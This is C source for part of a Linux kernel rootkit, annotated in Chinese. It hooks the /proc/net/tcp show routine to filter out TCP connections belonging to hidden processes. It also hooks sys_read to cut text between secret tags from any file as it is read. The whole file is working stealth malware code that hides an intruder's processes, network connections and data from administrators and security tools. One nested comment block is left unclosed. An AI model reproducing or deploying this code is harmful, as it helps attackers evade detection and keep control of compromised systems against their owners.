/**************
隐藏被隐藏进程的TCP连接，hook /proc/net/tcp的show函数，通过被隐藏进程的/proc/pid/fd文件夹加载需要被屏蔽的tcp的inode信息，过滤这些tcp信息
*************/
#define PRG_SOCKET_PFX "socket:["
#define PRG_SOCKET_PFXl (strlen(PRG_SOCKET_PFX))
static void extract_type_1_socket_inode(const char lname[], long *inode_p)	//从类似于socket:[12345]中提取12345，该数字即是inode节点，否则返回-1
{
    if (strlen(lname) < PRG_SOCKET_PFXl + 3)	//通过各种长度判断以及尾部字符判断，筛选掉不规范的字符串
        *inode_p = -1;
    else if (memcmp(lname, PRG_SOCKET_PFX, PRG_SOCKET_PFXl))
        *inode_p = -1;
    else if (lname[strlen(lname) - 1] != ']')
        *inode_p = -1;
    else
    {
        char inode_str[strlen(lname + 1)]; 
        const int inode_str_len = strlen(lname) - PRG_SOCKET_PFXl - 1;//这个长度是其中节点数字的长度
        int err;

        strncpy(inode_str, lname + PRG_SOCKET_PFXl, inode_str_len);
        inode_str[inode_str_len] = '\0';		//把字符串中的数字信息拷贝到inode_str中
        err = kstrtol(inode_str, 10, inode_p);		//把字符串转化为整数
        if (err || *inode_p < 0 || *inode_p >= INT_MAX)//如果数字小于0或者超过int范围，则判断不对
            *inode_p = -1;
    }
}

int load_inodes_of_process(const char *name)		//检查需要被隐藏进程的fd，如果fd中存在软连接到socket的，软链接的目标将是类似socket:[12345]的形式，12345即是socket的inode节点，将这些inode节点记录下来
{
    char *path = NULL;		
    int path_len;
    long fd;
    long read;
    long bpos;
    struct linux_dirent *dirent = NULL;
    struct linux_dirent *d;

    if (DEBUG)
        printk(KERN_INFO "collecting descriptors of %s\n", name);

    path_len = strlen("/proc/") + strlen(name) + strlen("/fd");
    path = kmalloc(path_len + 1, GFP_KERNEL);
    if (!path)
        goto end;
    strcpy(path, "/proc/");
    strcat(path, name);
    strcat(path, "/fd");
	/*
		到这里构造出一个字符串路径path=”/proc/[name]/fd”
	*/
    fd = ref_sys_open(path, O_RDONLY | O_DIRECTORY, 0);	//以只读的方式打开文件，并且若path所只的并非是一个目录则打开失败
    dirent = kmalloc(MAX_DIRENT_READ, GFP_KERNEL);
    if (!dirent)		//开辟空间失败,直接返回
        goto end;
    //listing directory /proc/[id]/fd
    //and then, calling readlink which returns inode of socket
    //dirent is a memory allocated in kernel space, it should be in user space but it works thanks to set_fs(KERNEL_DS);
    read = ref_sys_getdents(fd, dirent, MAX_DIRENT_READ);	//把fd所指的文件目录读入到dirent中，返回填充的字节数
    if (read <= 0)	//读取失败直接返回
        goto end;
    for (bpos = 0; bpos < read;) 
    {
        d = (struct linux_dirent *)((char *)dirent + bpos);
/*
开辟的结构体linux_dirent其中包含的元素如下所示
struct dirent
{
    long d_ino;                 /* inode number 索引节点号 */
    off_t d_off;                /* offset to this dirent 在目录文件中的偏移 */
    unsigned short d_reclen;    /* length of this d_name 文件名长 */
    unsigned char d_type;        /* the type of d_name 文件类型 */    
    char d_name [NAME_MAX+1];   /* file name (null-terminated) 文件名，最长255字符 */
}

        if (d->d_ino != 0)		//如果索引节点号不为0
        {
            if (strcmp(d->d_name, "0") && strcmp(d->d_name, "1") && strcmp(d->d_name, "2") && strcmp(d->d_name, ".") && strcmp(d->d_name, ".."))	//如果文件名不是0，1，2，.，..的话
            {
                char lname[30];
                char line[40];
                int lnamelen;
                long inode;

                snprintf(line, sizeof(line), "%s/%s", path, d->d_name);	//把path和文件名拼接起来，形成新的路径
                lnamelen = ref_sys_readlink(line, lname, sizeof(lname) - 1);	//把新的路径链接内容存储到lnname中，函数返回的是字符串字符数
                if (lnamelen == -1)	//失败则继续循环
                {
                    bpos += d->d_reclen;
                    continue;
                }
                lname[MIN(lnamelen, sizeof(lname) - 1)] = '\0';
                extract_type_1_socket_inode(lname, &inode);	//从存储的内容中得到inode的值
                if (inode != -1)		//如果inode节点值是符合规范的
                    make_inode_hidden(inode);	//把这个新的inode信息添加到链表中
            }
        }
        bpos += d->d_reclen;	//循环加上这个文件名的长度
    }

end:		//释放内存空间
    kfree(dirent);
    kfree(path);
    return 0;
}

void load_inodes_to_hide(void)	//从需要被隐藏的进程中寻找需要被隐藏的socket结点
{
    //enum /proc
    struct linux_dirent *dirent = NULL;
    struct linux_dirent *d;
    mm_segment_t old_fs;
    long fd, read, bpos;

    old_fs = get_fs();
    set_fs(KERNEL_DS);	//这两句改变了用户空间的限制，即扩大了用户空间范围，因此即可使用在内核中的参数了
    fd = ref_sys_open("/proc", O_RDONLY | O_DIRECTORY, 0);	//以只读方式打开文件，若不为目录打开失败
    if (fd < 0)	//打开失败直接返回
        return;
    dirent = kmalloc(MAX_DIRENT_READ, GFP_KERNEL);	//开辟内存空间
    if (!dirent)		//开辟空间失败直接返回
        goto end;
    read = ref_sys_getdents(fd, dirent, MAX_DIRENT_READ);	//把fd所指的文件目录读入到dirent中，返回填充的字节数
    if (read <= 0)	//读入失败，直接返回
        goto end;
    for (bpos = 0; bpos < read;)
    {
        d = (struct linux_dirent *)((char *)dirent + bpos);
        if (d->d_ino != 0)	//如果索引节点号不为0
        {
            if (should_be_hidden((char *)d->d_name))		//确认这个目录项是否需要被隐藏
                load_inodes_of_process((char *)d->d_name);	//调用上面的函数，把节点号记录下来
        }
        bpos += d->d_reclen;
    }
    set_fs(old_fs);
end:
    set_fs(old_fs);
    kfree(dirent);	//释放内存
}

char *next_column(char *ptr)	//读取下一行，帮助函数
{
    while (*ptr != ' ')
        ptr++;
    while (*ptr == ' ')
        ptr++;
    return ptr;
}

// 内核信息，检测是否有需要隐藏的函数，替换函数指针
//对/proc/net/tcp文件对show函数对hook函数，该文件是特殊文件，通过他可以获得tcp连接信息。调用原始函数后，对内容进行过滤，删除掉需要被隐藏的inode条目
/*其中seq_file的结构体格式如下：
struct seq_file {
    char *buf;       //在seq_open中分配，大小为4KB
    size_t size;     //4096
    size_t from;     //struct file从seq_file中向用户态缓冲区拷贝时相对于buf的偏移地址
    size_t count;    //可以拷贝到用户态的字符数目
    loff_t index;    //从内核态向seq_file的内核态缓冲区buf中拷贝时start、next的处理的下标pos数值，即用户自定义遍历iter
    loff_t read_pos; //当前已拷贝到用户态的数据量大小，即struct file中拷贝到用户态的数据量
    u64 version; 
    struct mutex lock; //保护该seq_file的互斥锁结构
    const struct seq_operations *op; //seq_start,seq_next,set_show,seq_stop函数结构体
    void *private;
};
*/
int new_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char *net_buf = NULL;
    char *line_ptr;
    mm_segment_t oldfs;
    int i;
    char *column;
    char *space;
    long inode;
    int err;

    load_inodes_to_hide();	//调用上面的函数，从需要被隐藏的进程中寻找需要被隐藏的socket结点
    ret = ref_seq_show(seq, v);	// ref_seq_show向ret里填充一项纪录

    oldfs = get_fs();
    set_fs(get_ds());
    //这两句改变了用户空间的限制，即扩大了用户空间范围，因此即可使用在内核中的参数了
    net_buf = seq->buf + seq->count - 150;	//内核源码里是这样定义的,/proc/net/tcp 里的每一条记录都是 149 个字节（不算换行）长，不够的用空格补齐。这句话是记录的起始等于缓冲区起始加上已有量减去每条记录的大小
    if (net_buf == NULL)
        goto end;

    column = net_buf;
    for (i = 0; i < 10; i++)
        column = next_column(column);

    space = strchr(column, ' ');
    if (!space) //如果文件不是规范的格式
        goto end;
    *space = 0;
    err = kstrtol(column, 10, &inode);
    *space = ' ';
    if (err)
        goto end;
    if (is_inode_hidden(inode))	//判断这个节点是否被隐藏
    {
        seq->count -= 150;		//如果隐藏了，把count减去一个记录大小，相当于把这个记录删除了
    }

    goto end;

end:
    set_fs(oldfs);
    return ret;
}


/**************
隐藏特定tag间的内容
*************/
int hide_file_content = 1;	//隐藏标志，隐藏为1，不隐藏为0
atomic_t read_on;
int f_check(void *arg, ssize_t size)		//判断是否包含特定的tag内容
{
    char *buf;
    if ((size <= 0) || (size >= SSIZE_MAX))	//若长度小于0或者大于最大值，则判断不是
        return (-1);
    buf = (char *)kmalloc(size + 1, GFP_KERNEL);	//给buf分配内存空间，GFP_KERNEL表示正常分配，若不够则进入睡眠等待内存分配
    if (!buf)		//开辟空间失败
        return (-1);
    if (copy_from_user((void *)buf, (void *)arg, size))	//copy_from_user第一个参数是内核空间的指针，第二个参数是用户指针，第三个参数是需要拷贝的字节数。成功拷贝返回0，不成功则返回字节数。这局判断为拷贝不成功，则跳转释放内存。
        goto out;
    buf[size] = 0;
    if ((strstr(buf, HIDETAGIN) != NULL) && (strstr(buf, HIDETAGOUT) != NULL))  //buf已经拷贝到了用户提供的内容，然后判断buf字符串中，HIDERAGIN和HIDETAOUT是否为其中的子串，如果都是子串的话，则传入内容包括特定的tag内容，返回正确。HIDERAGIN和HIDETAOUT已进行宏定义，代表tag的开始与结束标志。
    {
        kfree(buf);	//释放buff的内存空间
        return (1);
    }
out:
    kfree(buf);	//释放buff的内存空间
    return (-1);
}

int hide_content(void *arg, ssize_t size)		//隐藏特定tag间的内容
{
    char *buf, *p1, *p2;
    int i, newret;
    buf = (char *)kmalloc(size, GFP_KERNEL);		//开辟buff空间
    if (!buf)	//开辟空间失败，返回失败
        return (-1);
    if (copy_from_user((void *)buf, (void *)arg, size))	//将用户内容拷贝给buf，失败释放返回字节数
    {
        kfree(buf);
        return size;
    }
    p1 = strstr(buf, HIDETAGIN);	//p1是buf子串中第一个找到HIDETAGIN的位置
    p2 = strstr(buf, HIDETAGOUT);  // p2是buf子串中第一个找到HIDETAGOUT的位置
    p2 += strlen(HIDETAGOUT);	//把p2的指针位置移动到HIDETAGOUT的尾部
    if (p1 >= p2 || !p1 || !p2)	//如果p1的位置在p2之后，或者p1，p2有没找到的情况，释放内存返回
    {
        kfree(buf);
        return size;
    }

    i = size - (p2 - buf);	//i代表字符串在p2指针之后的长度
    memmove((void *)p1, (void *)p2, i);	//把p2开始的内存空间，复制i个字节到p1的位置，这样p1与p2之间的内容就消除了
    newret = size - (p2 - p1);	//newret是在改变之后整体的长度

    if (copy_to_user((void *)arg, (void *)buf, newret))	//把内核空间数据拷贝到用户空间，失败释放内存返回字节数
    {
        kfree(buf);
        return size;
    }

    kfree(buf);		//成功拷贝之后释放内存
    return newret;	//返回新的数据长度
}

struct file *e_fget_light(unsigned int fd, int *fput_needed)	//通过fd获取相应的file，降低对性能的影响
{
    struct file *file;
    struct files_struct *files = current->files;	//当前进程中获取结构体file_struct数据,找到文件描述表
    *fput_needed = 0;
if (likely((atomic_read(&files->count) == 1)))	//likely代表atomic_read(&files->count) == 1是和可能发生的，于是把将这个if中的内容编译提到前面有利于cpu的预存，提高效率。判断的内容为如果这有一个进程使用这个结构体那么就不要考虑锁，否则需要先得到锁在运行。
    {
        file = fcheck(fd);	//由fd的值取得file
    }
    else
    {
        spin_lock(&files->file_lock);	//锁住file_struct
        file = fcheck(fd);	//由fd的值取得file
        if (file)
        {
            get_file(file);
            *fput_needed = 1;
        }
        spin_unlock(&files->file_lock);		//解锁file_struct
    }
    return file;	//返回获取的file
}

asmlinkage ssize_t new_sys_read(unsigned int fd, char __user *buf, size_t count)	//对read调用的hook函数，函数开始会预先尝试获取文件的锁，失败时不做处理，这样做的原因是，需要隐藏特定内容对文件一般是不经常被读写的，所以可以获取锁，而对于高IO的文件可以降低性能影响
{
    struct file *f;
    int fput_needed;
    ssize_t ret;
    if (hide_file_content)	//如果内容被隐藏
    {
        ret = -EBADF;
        atomic_set(&read_on, 1);
        f = e_fget_light(fd, &fput_needed);	//获取fd对应的文件
        if (f)	//如果存在文件f
        {
            ret = vfs_read(f, buf, count, &f->f_pos);	//在kernel中读取文件
            if (f_check(buf, ret) == 1)		//如果读取的文件中包含tag内容
                ret = hide_content(buf, ret);	//将其中的tag内容隐藏
            fput_light(f, fput_needed);	//更新文件的引用计数
        }
        atomic_set(&read_on, 0);
    }
    else
    {
        ret = ref_sys_read(fd, buf, count); //为隐藏直接读取
    }
    return ret;
}
